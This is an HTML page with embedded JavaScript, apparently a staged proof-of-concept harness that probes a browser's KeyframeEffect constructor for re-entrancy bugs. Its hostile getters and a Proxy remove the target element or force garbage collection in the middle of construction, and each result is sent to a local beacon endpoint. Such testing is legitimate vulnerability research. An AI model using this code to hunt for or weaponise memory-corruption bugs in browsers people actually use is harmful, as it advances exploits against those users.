<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1188 KeyframeEffect Re-entrancy</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1188 — KEYFRAMEEFFECT RE-ENTRANCY (exact-source audited)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1188-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1188: KeyframeEffect construction re-entrancy (audited against the
   exact branch: KeyframeEffect.cpp:222-246 reads keyframe properties via
   JS getters while holding the target). Hostile getters remove/mutate
   the target mid-construction. Stages:
   0: feature detect (KeyframeEffect / element.animate)
   1: opacity getter removes target; new KeyframeEffect + play
   2: options.duration getter removes target
   3: Proxy keyframes array (index getter mutates array)
   4: element.animate x50 with hostile getters
   5: getter fires heavy GC pressure during conversion
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['detect','propGetter','optGetter','proxyArr','animate50','gcGetter'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1188_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1188_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1188_stage');}catch(e){}
}else{

try{localStorage.setItem('p1188_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1188_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');
  setTimeout(function(){location.reload(true);},700);
}
function mkEl(){
  var el=document.createElement('div');
  el.style.cssText='width:50px;height:50px;background:#f00';
  document.body.appendChild(el);
  return el;
}
function gcP(){for(var g=0;g<3000;g++){var t=new ArrayBuffer(2048);t=null;}}

if(cur==='detect'){
  var hasKE=(typeof KeyframeEffect==='function');
  var el=mkEl();
  var hasAnimate=(typeof el.animate==='function');
  done('KeyframeEffect='+hasKE+'|animate='+hasAnimate);
}else if(cur==='propGetter'){
  setPhase('keyframe property getter removes target');
  var el2=mkEl();
  var kf={
    opacity:{}
  };
  Object.defineProperty(kf,'opacity',{configurable:true,get:function(){
    B('PROP-GETTER','fired');
    el2.remove();
    return 1;
  }});
  var rep;
  try{
    var ef=new KeyframeEffect(el2,[kf],{duration:100});
    var anim=new Animation(ef,document.timeline);
    anim.play();
    rep='SURVIVED';
  }catch(e){rep='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep);
}else if(cur==='optGetter'){
  setPhase('options.duration getter removes target');
  var el3=mkEl();
  var opts={};
  Object.defineProperty(opts,'duration',{configurable:true,get:function(){
    B('OPT-GETTER','fired');
    el3.remove();
    return 100;
  }});
  var rep2;
  try{
    var ef2=new KeyframeEffect(el3,[{opacity:0}],opts);
    var anim2=new Animation(ef2,document.timeline);
    anim2.play();
    rep2='SURVIVED';
  }catch(e){rep2='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep2);
}else if(cur==='proxyArr'){
  setPhase('Proxy keyframes array');
  var el4=mkEl();
  var base=[{opacity:0},{opacity:1}];
  var prox=new Proxy(base,{
    get:function(t,p){
      B('ARR-GETTER','p='+String(p));
      if(p==='1'){el4.remove();}
      return t[p];
    }
  });
  var rep3;
  try{
    var ef3=new KeyframeEffect(el4,prox,{duration:100});
    var anim3=new Animation(ef3,document.timeline);
    anim3.play();
    rep3='SURVIVED';
  }catch(e){rep3='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep3);
}else if(cur==='animate50'){
  setPhase('animate x50 hostile');
  var n=0,rep4='';
  try{
    for(var i=0;i<50;i++){
      var el5=mkEl();
      var kf5={};
      Object.defineProperty(kf5,'opacity',{configurable:true,get:function(){
        if(n===25)el5.remove();
        return 0.5;
      }});
      el5.animate([kf5],{duration:100});
      n++;
    }
    rep4='SURVIVED-50';
  }catch(e){rep4='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep4);
}else if(cur==='gcGetter'){
  setPhase('getter heavy GC during conversion');
  var el6=mkEl();
  var kf6={};
  Object.defineProperty(kf6,'opacity',{configurable:true,get:function(){
    gcP();
    return 1;
  }});
  var rep5;
  try{
    var ef6=new KeyframeEffect(el6,[kf6],{duration:100});
    var anim6=new Animation(ef6,document.timeline);
    anim6.play();
    rep5='SURVIVED';
  }catch(e){rep5='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep5);
}

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1188-keyframe-reent';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
